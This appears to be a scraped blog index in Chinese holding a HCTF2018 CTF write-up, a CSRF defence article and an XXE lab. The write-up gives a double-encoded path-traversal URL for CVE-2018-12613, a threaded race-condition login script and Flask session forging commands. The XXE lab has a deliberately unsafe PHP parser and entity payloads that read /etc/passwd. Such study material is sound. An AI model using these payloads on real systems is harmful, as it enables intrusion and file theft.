print(md5value(&#x27;*c].)Y!x&lt;kr1e2_oQ(zO6Xd5D9ZKw7IPCs#4h~R-JFa3Vp8B0N&gt;%+WgjHbvfM@[U&#x27;)) # print(&#x27;&#x27;+md5value(filename)) print(md5value(aaa+md5value(filename))) mdfive2() 护网杯 2018护网杯第一场 web easy tornado LTshop超详细解答"},{"title":"HCTF2018","date":"2020-02-25","updated":"2024-03-19","path":"2020/02/25/HCTF2018/","text":"WarmUp 题目原型是phpmyadmin4.8.1的任意文件包含漏洞 题目源码source.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849 &lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) &#123; echo &quot;you can&#x27;t see it&quot;; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo &quot;you can&#x27;t see it&quot;; return false; &#125; &#125; if (! empty($_REQUEST[&#x27;file&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;]) &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;]) ) &#123; include $_REQUEST[&#x27;file&#x27;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; &#125; ?&gt; 还有hint.php中提示flag在ffffllllaaaagggg中 可以看到函数代码中有四个if语句 第一个if语句对变量进行检验，要求$page为字符串，否则返回false 第二个if语句判断page是否存在于page是否存在于page是否存在于whitelist数组中，存在则返回true 第三个if语句判断截取后的page是否存在于page是否存在于page是否存在于whitelist数组中，截取$page中’?'前部分，存在则返回true 第四个if语句判断url解码并截取后的page是否存在于page是否存在于page是否存在于whitelist中，存在则返回true 若以上四个if语句均未返回值，则返回false 有三个if语句可以返回true，第二个语句直接判断$page，不可用 第三个语句截取’?‘前部分，由于?被后部分被解析为get方式提交的参数，也不可利用 第四个if语句中，先进行url解码再截取，因此我们可以将?经过两次url编码(GET方式提交的话两次编码，POST提交的话一次编码就好也就是%3f)，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为’?‘，仍可通过第四个if语句校验。（’?‘两次编码值为’%253f’）,构造url： http://***:***/source.php?file=source.php%253f../ffffllllaaaagggg 原理是hint.php?/被当作目录，之后上跳目录就好了（这个只适用于linux） 与include函数不一样， mkdir函数，如果不存在目录就会报错 无返回值，由于我们不知道ffffllllaaaagggg文件的具体位置，只能依次增加…/，最终在 http://***:***/source.php?file=source.php%253f../../../../../ffffllllaaaagggg中成功回显flag 该漏洞cve编号为CVE-2018-12613，详情请戳 admin Unicode cheat HCTFadmin 在修改密码界面发现源码，下载 1. 条件竞争 在修改密码的函数中将需要更改密码的name替换成了session[name],而在登录函数中没有经过验证就将session[name]赋值成了用户输入的name，所以可能存在条件竞争，一个线程不断登录将session[name]=name，另一个线程不断改变用户密码name=session[name] 12345678910111213141516171819202122232425262728293031323334353637383940414243444546import threadingimport requestsimport timedef login(s,username,password): data = &#123; &#x27;username&#x27;:username, &#x27;password&#x27;:password, &#x27;submit&#x27;:&#x27;&#x27; &#125; r = s.post(&#x27;http://13x.xx7.xx.xxx:9999/login&#x27;,data=data) return rdef logout(s): s.get(&#x27;http://13x.xx7.xx.xxx:9999/logout&#x27;)def change_pwd(s,newpass): data = &#123; &#x27;newpassword&#x27;:newpass &#125; s.post(&#x27;http://13x.xx7.xx.xxx:9999/change&#x27;,data=data)def func1(s): try: login(s,&#x27;Miracle778&#x27;,&#x27;Miracle778&#x27;) change_pwd(s,&#x27;Miracle778&#x27;) except Exception: passdef func2(s): try: logout(s) r = login(s,&#x27;admin&#x27;,&#x27;Miracle778&#x27;) if &#x27;&lt;a href=&quot;/index&quot;&gt;/index&lt;/a&gt;&#x27; in r.text: print(r.text) exit(0) except Exception: passfor i in range(10000): print(i) s = requests.Session() t1 = threading.Thread(target=func1,args=(s,)) t2 = threading.Thread(target=func2,args=(s,)) t2.start() t1.start() 2. unicode欺骗 https://www.anquanke.com/post/id/164086#h3-13 3. flask伪造session 12345root@kali:~/tool/flask_Session_EnDecode# python3 flask_session_manage.py decode -s &quot;ckj123&quot; -c &quot;.eJw9kEGLwjAQhf_KkrOH1LYXwYMwbbEwCUo0TC7ittUmMS5UxbXif9_ggod3eo9v5r0n2x2G7tKz2XW4dRO2sy2bPdnXN5sxE_BOapOIQKmERYpqNQpoclKYCqh7WRFHXXChKTGAI0JzNxDz49YbaB6oMSVN3IDpjVqfJBgrQn0SqvZY1U5C7XBqPKrSGojSqxyr0lLAB7rW4pQyqfwvjZSJcZlJKDIEekSOw4pyVCYIaIPRxZy9Jqy5DIfd9cd3508FcsVIY-llfI_cySEsuIBNSqH0pFfcuFjHUTzhU6yWnKaYi-P8jbNhf-w-JFG12_Xi3znvQzTYvg32nLAJu1264T0cSzh7_QEjBGtS.XlfUdQ.yJsOhT6DGnYmPr536hldq7Edh54&quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;fc0a556f7807143479a3742a8f41a45f5d33070d5575dd721c7af4d6ae4e86b6be52d0bc82c3fd11bd1bed90abbc227b3f8991c6872881806286c0f916f47fea&#x27;, &#x27;csrf_token&#x27;: b&#x27;b13c1d833b9c004457badad4f79b61c970b4cc96&#x27;, &#x27;image&#x27;: b&#x27;4gUD&#x27;, &#x27;name&#x27;: &#x27;admin1&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;root@kali:~/tool/flask_Session_EnDecode# python3 flask_session_manage.py encode -s &quot;cjk123&quot; -t &quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;fc0a556f7807143479a3742a8f41a45f5d33070d5575dd721c7af4d6ae4e86b6be52d0bc82c3fd11bd1bed90abbc227b3f8991c6872881806286c0f916f47fea&#x27;, &#x27;csrf_token&#x27;: b&#x27;b13c1d833b9c004457badad4f79b61c970b4cc96&#x27;, &#x27;image&#x27;: b&#x27;4gUD&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&quot;.eJw9kEGLwjAQhf_KkrOHaNuL4EGYtliYBCUaJhdx26pJjAtVcY343ze44OGd3uObee_JtvuhvxzZ9Drc-hHb2o5Nn-zrm02ZCXgntR6LQJmEeYZqGQW0BSnMBDRHWRNHXXKhaWwAI0J7N5DyceMNtA_UmJEmbsAcjVqdJBgrQnMSqvFYN05C43BiPKrKGkjSywLrylLAB7rO4oRyqfwvRcpFXOQSyhyBHonjsKYClQkCumB0OWOvEWsvw357_fH9-VOBXBkpVl6m98idHMKcC1hnFCpPesmNS3UcpRM-w3rBaYKFOMzeOBt2h_5DEnW3Wc3_nfMuJIPtumDPbMRul35478bGnL3-ALk7ayE.ETlp3A.R2v1zoHqQz4dIY12sM2A4LbLGW8 据说约束攻击也是可以的"},{"title":"CSRF漏洞","date":"2020-02-25","updated":"2024-03-19","path":"2020/02/25/CSRF漏洞/","text":"什么是CSRF ​ CSRF（Cross-site request forgery）跨站请求伪造，也被称为“one click attack”或者session riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。CSRF通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。 ​ ​ 下图是一次完整的CSRF攻击示意图。用户登录并访问了一正常网站，登录成功后，网站返回用户的身份标识Cookie给用户。当用户访问到恶意网站时，恶意网站强制用户去向正常网站发送恶意请求。由于用户此时拥有正常网站的Cookie，所以就相当于攻击者盗用了用户身份，去访问了正常（目标）网站。 一次完整的CSRF攻击，需要受害用户需要完成两个步骤： ​ 1.登录正常网站，并在本地生成Cookie。 ​ ​ 2.在不退出正常网站的情况下，访问恶意网站。 CSRF 背景与介绍 CSRF（Cross Site Request Forgery, 跨站域请求伪造）是一种网络的攻击方式，它在 2007 年曾被列为互联网 20 大安全隐患之一。其他安全隐患，比如 SQL 脚本注入，跨站域脚本攻击等在近年来已经逐渐为众人熟知，很多网站也都针对他们进行了防御。然而，对于大多数人来说，CSRF 却依然是一个陌生的概念。即便是大名鼎鼎的 Gmail, 在 2007 年底也存在着 CSRF 漏洞，从而被黑客攻击而使 Gmail 的用户造成巨大的损失。 CSRF 攻击实例 CSRF 攻击可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击站点，从而在并未授权的情况下执行在权限保护之下的操作。比如说，受害者 Bob 在银行有一笔存款，通过对银行的网站发送请求 http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2 可以使 Bob 把 1000000 的存款转到 bob2 的账号下。通常情况下，该请求发送到网站后，服务器会先验证该请求是否来自一个合法的 session，并且该 session 的用户 Bob 已经成功登陆。黑客 Mallory 自己在该银行也有账户，他知道上文中的 URL 可以把钱进行转帐操作。Mallory 可以自己发送一个请求给银行：http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory。但是这个请求来自 Mallory 而非 Bob，他不能通过安全认证，因此该请求不会起作用。这时，Mallory 想到使用 CSRF 的攻击方式，他先自己做一个网站，在网站中放入如下代码： src=”http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory ”，并且通过广告等诱使 Bob 来访问他的网站。当 Bob 访问该网站时，上述 url 就会从 Bob 的浏览器发向银行，而这个请求会附带 Bob 浏览器中的 cookie 一起发向银行服务器。大多数情况下，该请求会失败，因为他要求 Bob 的认证信息。但是，如果 Bob 当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，浏览器的 cookie 之中含有 Bob 的认证信息。这时，悲剧发生了，这个 url 请求就会得到响应，钱将从 Bob 的账号转移到 Mallory 的账号，而 Bob 当时毫不知情。等以后 Bob 发现账户钱少了，即使他去银行查询日志，他也只能发现确实有一个来自于他本人的合法请求转移了资金，没有任何被攻击的痕迹。而 Mallory 则可以拿到钱后逍遥法外。 CSRF 攻击的对象 在讨论如何抵御 CSRF 之前，先要明确 CSRF 攻击的对象，也就是要保护的对象。从以上的例子可知，CSRF 攻击是黑客借助受害者的 cookie 骗取服务器的信任，但是黑客并不能拿到 cookie，也看不到 cookie 的内容。另外，对于服务器返回的结果，由于浏览器同源策略的限制，黑客也无法进行解析。因此，黑客无法从返回的结果中得到任何东西，他所能做的就是给服务器发送请求，以执行请求中所描述的命令，在服务器端直接改变数据的值，而非窃取服务器中的数据。所以，我们要保护的对象是那些可以直接产生数据改变的服务，而对于读取数据的服务，则不需要进行 CSRF 的保护。比如银行系统中转账的请求会直接改变账户的金额，会遭到 CSRF 攻击，需要保护。而查询余额是对金额的读取操作，不会改变数据，CSRF 攻击无法解析服务器返回的结果，无需保护。 当前防御 CSRF 的几种策略 在业界目前防御 CSRF 攻击主要有三种策略：验证 HTTP Referer 字段；在请求地址中添加 token 并验证；在 HTTP 头中自定义属性并验证。下面就分别对这三种策略进行详细介绍。 验证 HTTP Referer 字段 根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问 http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory，用户必须先登陆 bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 bank.example 域名开头的地址。而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。 这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。 然而，这种方法并非万无一失。Referer 的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全。事实上，对于某些浏览器，比如 IE6 或 FF2，目前已经有一些方法可以篡改 Referer 值。如果 bank.example 网站支持 IE6 浏览器，黑客完全可以把用户浏览器的 Referer 值设为以 bank.example 域名开头的地址，这样就可以通过验证，从而进行 CSRF 攻击。 即便是使用最新的浏览器，黑客无法篡改 Referer 值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心 Referer 值会把组织内网中的某些信息泄露到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供 Referer。当他们正常访问银行网站时，网站会因为请求没有 Referer 值而认为是 CSRF 攻击，拒绝合法用户的访问。 在请求地址中添加 token 并验证 CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。 这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。对于 GET 请求，token 将附在请求地址之后，这样 URL 就变成 http://url?csrftoken=tokenvalue。 而对于 POST 请求来说，要在 form 的最后加上 ，这样就把 token 以参数的形式加入请求了。但是，在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 是很麻烦的，并且很容易漏掉，通常使用的方法就是在每次页面加载时，使用 javascript 遍历整个 dom 树，对于 dom 中所有的 a 和 form 标签后加入 token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的 html 代码，这种方法就没有作用，还需要程序员在编码时手动添加 token。 该方法还有一个缺点是难以保证 token 本身的安全。特别是在一些论坛之类支持用户自己发表内容的网站，黑客可以在上面发布自己个人网站的地址。由于系统也会在这个地址后面加上 token，黑客可以在自己的网站上得到这个 token，并马上就可以发动 CSRF 攻击。为了避免这一点，系统可以在添加 token 的时候增加一个判断，如果这个链接是链到自己本站的，就在后面添加 token，如果是通向外网则不加。不过，即使这个 csrftoken 不以参数的形式附加在请求之中，黑客的网站也同样可以通过 Referer 来得到这个 token 值以发动 CSRF 攻击。这也是一些用户喜欢手动关闭浏览器 Referer 功能的原因。 在 HTTP 头中自定义属性并验证 这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。 然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于 Ajax 方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行 CSRF 防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。 Java 代码示例 下文将以 Java 为例，对上述三种方法分别用代码进行示例。无论使用何种方法，在服务器端的拦截器必不可少，它将负责检查到来的请求是否符合要求，然后视结果而决定是否继续请求或者丢弃。在 Java 中，拦截器是由 Filter 来实现的。我们可以编写一个 Filter，并在 web.xml 中对其进行配置，使其对于访问所有需要 CSRF 保护的资源的请求进行拦截。 在 filter 中对请求的 Referer 验证代码如下 清单 1. 在 Filter 中验证 Referer 12345678// 从 HTTP 头中取得 Referer 值String referer=request.getHeader(&quot;Referer&quot;); // 判断 Referer 是否以 bank.example 开头if((referer!=null) &amp;&amp;(referer.trim().startsWith(“bank.example”)))&#123; chain.doFilter(request, response); &#125;else&#123; request.getRequestDispatcher(“error.jsp”).forward(request,response); &#125; 以上代码先取得 Referer 值，然后进行判断，当其非空并以 bank.example 开头时，则继续请求，否则的话可能是 CSRF 攻击，转到 error.jsp 页面。 以上代码先取得 Referer 值，然后进行判断，当其非空并以 bank.example 开头时，则继续请求，否则的话可能是 CSRF 攻击，转到 error.jsp 页面。 如果要进一步验证请求中的 token 值，代码如下 清单 2. 在 filter 中验证请求中的 token 1234567891011121314151617181920212223242526HttpServletRequest req = (HttpServletRequest)request; HttpSession s = req.getSession(); // 从 session 中得到 csrftoken 属性String sToken = (String)s.getAttribute(“csrftoken”); if(sToken == null)&#123; // 产生新的 token 放入 session 中 sToken = generateToken(); s.setAttribute(“csrftoken”,sToken); chain.doFilter(request, response); &#125; else&#123; // 从 HTTP 头中取得 csrftoken String xhrToken = req.getHeader(“csrftoken”); // 从请求参数中取得 csrftoken String pToken = req.getParameter(“csrftoken”); if(sToken != null &amp;&amp; xhrToken != null &amp;&amp; sToken.equals(xhrToken))&#123; chain.doFilter(request, response); &#125;else if(sToken != null &amp;&amp; pToken != null &amp;&amp; sToken.equals(pToken))&#123; chain.doFilter(request, response); &#125;else&#123; request.getRequestDispatcher(“error.jsp”).forward(request,response); &#125; &#125; 首先判断 session 中有没有 csrftoken，如果没有，则认为是第一次访问，session 是新建立的，这时生成一个新的 token，放于 session 之中，并继续执行请求。如果 session 中已经有 csrftoken，则说明用户已经与服务器之间建立了一个活跃的 session，这时要看这个请求中有没有同时附带这个 token，由于请求可能来自于常规的访问或是 XMLHttpRequest 异步访问，我们分别尝试从请求中获取 csrftoken 参数以及从 HTTP 头中获取 csrftoken 自定义属性并与 session 中的值进行比较，只要有一个地方带有有效 token，就判定请求合法，可以继续执行，否则就转到错误页面。生成 token 有很多种方法，任何的随机算法都可以使用，Java 的 UUID 类也是一个不错的选择。 除了在服务器端利用 filter 来验证 token 的值以外，我们还需要在客户端给每个请求附加上这个 token，这是利用 js 来给 html 中的链接和表单请求地址附加 csrftoken 代码，其中已定义 token 为全局变量，其值可以从 session 中得到。 清单 3. 在客户端对于请求附加 token 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162function appendToken()&#123; updateForms(); updateTags(); &#125; function updateForms() &#123; // 得到页面中所有的 form 元素 var forms = document.getElementsByTagName(&#x27;form&#x27;); for(i=0; i&lt;forms.length; i++) &#123; var url = forms[i].action; // 如果这个 form 的 action 值为空，则不附加 csrftoken if(url == null || url == &quot;&quot; ) continue; // 动态生成 input 元素，加入到 form 之后 var e = document.createElement(&quot;input&quot;); e.name = &quot;csrftoken&quot;; e.value = token; e.type=&quot;hidden&quot;; forms[i].appendChild(e); &#125; &#125; function updateTags() &#123; var all = document.getElementsByTagName(&#x27;a&#x27;); var len = all.length; // 遍历所有 a 元素 for(var i=0; i&lt;len; i++) &#123; var e = all[i]; updateTag(e, &#x27;href&#x27;, token); &#125; &#125; function updateTag(element, attr, token) &#123; var location = element.getAttribute(attr); if(location != null &amp;&amp; location != &#x27;&#x27; &#x27;&#x27; ) &#123; var fragmentIndex = location.indexOf(&#x27;#&#x27;); var fragment = null; if(fragmentIndex != -1)&#123; //url 中含有只相当页的锚标记 fragment = location.substring(fragmentIndex); location = location.substring(0,fragmentIndex); &#125; var index = location.indexOf(&#x27;?&#x27;); if(index != -1) &#123; //url 中已含有其他参数 location = location + &#x27;&amp;csrftoken=&#x27; + token; &#125; else &#123; //url 中没有其他参数 location = location + &#x27;?csrftoken=&#x27; + token; &#125; if(fragment != null)&#123; location += fragment; &#125; element.setAttribute(attr, location); &#125; &#125; 在客户端 html 中，主要是有两个地方需要加上 token，一个是表单 form，另一个就是链接 a。这段代码首先遍历所有的 form，在 form 最后添加一隐藏字段，把 csrftoken 放入其中。然后，代码遍历所有的链接标记 a，在其 href 属性中加入 csrftoken 参数。注意对于 a.href 来说，可能该属性已经有参数，或者有锚标记。因此需要分情况讨论，以不同的格式把 csrftoken 加入其中。 如果你的网站使用 XMLHttpRequest，那么还需要在 HTTP 头中自定义 csrftoken 属性，利用 dojo.xhr 给 XMLHttpRequest 加上自定义属性代码如下： 清单 4. 在 HTTP 头中自定义属性 1234567891011121314var plainXhr = dojo.xhr; // 重写 dojo.xhr 方法dojo.xhr = function(method,args,hasBody) &#123; // 确保 header 对象存在 args.headers = args.header || &#123;&#125;; tokenValue = &#x27;&lt;%=request.getSession(false).getAttribute(&quot;csrftoken&quot;)%&gt;&#x27;; var token = dojo.getObject(&quot;tokenValue&quot;); // 把 csrftoken 属性放到头中 args.headers[&quot;csrftoken&quot;] = (token) ? token : &quot; &quot;; return plainXhr(method,args,hasBody); &#125;; 这里改写了 dojo.xhr 的方法，首先确保 dojo.xhr 中存在 HTTP 头，然后在 args.headers 中添加 csrftoken 字段，并把 token 值从 session 里拿出放入字段中。 CSRF 防御方法选择之道 通过上文讨论可知，目前业界应对 CSRF 攻击有一些克制方法，但是每种方法都有利弊，没有一种方法是完美的。如何选择合适的方法非常重要。如果网站是一个现有系统，想要在最短时间内获得一定程度的 CSRF 的保护，那么验证 Referer 的方法是最方便的，要想增加安全性的话，可以选择不支持低版本浏览器，毕竟就目前来说，IE7+, FF3+ 这类高版本浏览器的 Referer 值还无法被篡改。 如果系统必须支持 IE6，并且仍然需要高安全性。那么就要使用 token 来进行验证，在大部分情况下，使用 XmlHttpRequest 并不合适，token 只能以参数的形式放于请求之中，若你的系统不支持用户自己发布信息，那这种程度的防护已经足够，否则的话，你仍然难以防范 token 被黑客窃取并发动攻击。在这种情况下，你需要小心规划你网站提供的各种服务，从中间找出那些允许用户自己发布信息的部分，把它们与其他服务分开，使用不同的 token 进行保护，这样可以有效抵御黑客对于你关键服务的攻击，把危害降到最低。毕竟，删除别人一个帖子比直接从别人账号中转走大笔存款严重程度要轻的多。 如果是开发一个全新的系统，则抵御 CSRF 的选择要大得多。笔者建议对于重要的服务，可以尽量使用 XMLHttpRequest 来访问，这样增加 token 要容易很多。另外尽量避免在 js 代码中使用复杂逻辑来构造常规的同步请求来访问需要 CSRF 保护的资源，比如 window.location 和 document.createElement(“a”) 之类，这样也可以减少在附加 token 时产生的不必要的麻烦。 最后，要记住 CSRF 不是黑客唯一的攻击手段，无论你 CSRF 防范有多么严密，如果你系统有其他安全漏洞，比如跨站域脚本攻击 XSS，那么黑客就可以绕过你的安全防护，展开包括 CSRF 在内的各种攻击，你的防线将如同虚设。 相关主题 维基百科 CSRF，这里对 CSRF 有一个较为全面地介绍。 http://en.wikipedia.org/wiki/Cross-site_request_forgery 开源项目 CSRFGuard，介绍了如何使用在 HTTP 请求中加入 token 并验证的方法来抵御 CSRF。http://www.owasp.org/index.php/Category:OWASP_CSRFGuard_Project Prevent Cross-site Request Forgery: PCRF。建议了一种在 PHP 中使用 token 来抵御 CSRF 的方法。 http://userweb.cs.utexas.edu/~samuel/PCRF/Final_PCRF_paper.pdf Robust Defenses for Cross-site Request Forgery：分析了一些常用的 CSRF 抵御方法并独创性的提出增强浏览器的解决方案。 developerWorks Web development 专区：通过专门关于 Web 技术的文章和教程，扩展您在网站开发方面的技能。 developerWorks Ajax 资源中心：这是有关 Ajax 编程模型信息的一站式中心，包括很多文档、教程、论坛、blog、wiki 和新闻。任何 Ajax 的新信息都能在这里找到。 developerWorks Web 2.0 资源中心，这是有关 Web 2.0 相关信息的一站式中心，包括大量 Web 2.0 技术文章、教程、下载和相关技术资源。您还可以通过 Web 2.0 新手入门 栏目，迅速了解 Web 2.0 的相关概念。 查看 HTML5 专题，了解更多和 HTML5 相关的知识和动向。 https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/"},{"title":"XXE漏洞","date":"2020-02-25","updated":"2024-03-19","path":"2020/02/25/XXE漏洞/","text":"DTD: //EMPTY关键字表示元素是个空元素 &lt;!ELEMENT root ANY&gt; //ANY关键字表示元素中可以出现任何内容,也可以为空 //下面这个声明表示root中可以有文本,也可以是空 &lt;!ELEMENT root (#PCDATA)&gt; //()表示一个分组,其中是放的允许在元素出现的内容,#PCDATA表示文本 &lt;!ELEMENT root (child)&gt; //child是子元素的名称,这个声明表示root中必须且只能有一个child元素 &lt;!ELEMENT root (child1,child2)&gt; //以逗号分隔,表示子元素依次出现 &lt;!ELEMENT root (child1|child2)&gt; //竖线与&quot;OR&quot;的意思相近,表示root元素中只能出现child1或child2 &lt;!ELEMENT root (child?)&gt; //root中child子元素可以出现一次,也可以不出现 &lt;!ELEMENT root (child+)&gt; //root中child子元素至少出现一次 &lt;!ELEMENT root (child*)&gt; //root中child子元素可以出现任意次数或不出现 &lt;!ELEMENT root (child,(a,b))&gt; //()还可以嵌套,这里表示root元素中第一次子元素必须是child //紧接着是a或b &lt;!ELEMENT root (child,(a,b)+)&gt; //*,?,+这些量词可作用于分组,这里表示root元素中第一次子元素必须是child //紧接着是a或b出现一次或多次 实验 环境搭建 xmlres.php代码: 12345678&lt;?php libxml_disable_entity_loader(false); $xmlfile = file_get_contents($_GET[&#x27;file&#x27;]); $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $roots = simplexml_import_dom($dom); echo $roots;?&gt; 实验一：踩坑普通XXE 思考:为什么不能直接在XML文件中进行参数实体拼接然后引用呢？如下： 建立a.xml 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE root [&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;&lt;!ENTITY all &quot;%start;%file;%end&quot;&gt;]&gt; &lt;root&gt;&amp;all;&lt;/root&gt; 访问php文件 1http://127.0.0.1/XML/xmlres.php?file=a.xml 报错：Warning: DOMDocument::loadXML(): PEReferences forbidden in internal subset in Entity… 原因：In the internal subset of DTD, references to parameter entities are not allowed within markup declarations. You have to use an external DTD规则 也就是说在DTD内部子集中，参数实体的引用不允许在标记声明里。在外部DTD中，是可以的 更改如下: 新建外部dtd文件a.dtd : 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;&lt;!ENTITY % goodies SYSTEM &quot;file:///var/www/html/XML/file&quot;&gt;&lt;!ENTITY all &quot;%start;%goodies;%end&quot;;&gt; 修改a.xml如下： 123456&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE root [&lt;!ENTITY % file SYSTEM &quot;file:///var/www/html/XML/a.dtd&quot;&gt;%file;]&gt; &lt;root&gt;&amp;all;&lt;/root&gt; 执行php文件，继续报错：Warning: DOMDocument::loadXML(): EntityValue: ‘%’ forbidden except for entities references in file:///var/www/html/XML/a.dtd 原因：报错已经说的很清楚了，%不允许出现在Entity的value中. 所以需要将%进行Unicode编码为&amp;#37;（在xml中Unicode编码与字符本身是一样的） 更改如下： 修改a.dtd : 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;&lt;!ENTITY % goodies SYSTEM &quot;file:///var/www/html/XML/file&quot;&gt;&lt;!ENTITY all &quot;&amp;#37;start;&amp;#37;goodies;&amp;#37;end&quot;&gt; 执行PHP后发现并没有对%start;%goodies;%end进行解析 原因：需要在外面包一个参数实体int的声明，%int;引用的时候%file;会被成功解析，然后再%all;就可以成功的将解析%goodies;的内容传出。所以%int只是辅助的作用，用于辅助解释send实体内容。 更改如下： 修改a.dtd : 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;&lt;!ENTITY % goodies SYSTEM &quot;file:///var/www/html/XML/file&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY all &#x27;%start;%goodies;%end;&#x27;&gt;&quot;&gt; 修改a.xml : 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE root [&lt;!ENTITY % file SYSTEM &quot;file:///var/www/html/XML/a.dtd&quot;&gt;%file;%int;]&gt; &lt;root&gt;&amp;all;&lt;/root&gt; 正常解析file中的文件内容 实验二 ：通过重写本地dtd中的参数实体实现调用 有时候服务器配置好防火墙，禁止服务器请求外网dtd文件的话，就不能外带数据了。这时候就可以考虑利用本地dtd来进行XXE。 Ubuntu系统自带/usr/share/yelp/dtd/docbookx.dtd 它定义了很多参数实体并调用了它。我们可以在内部重写一个dtd文件中含有的参数实体，而此时调用是在外部，可以实现。 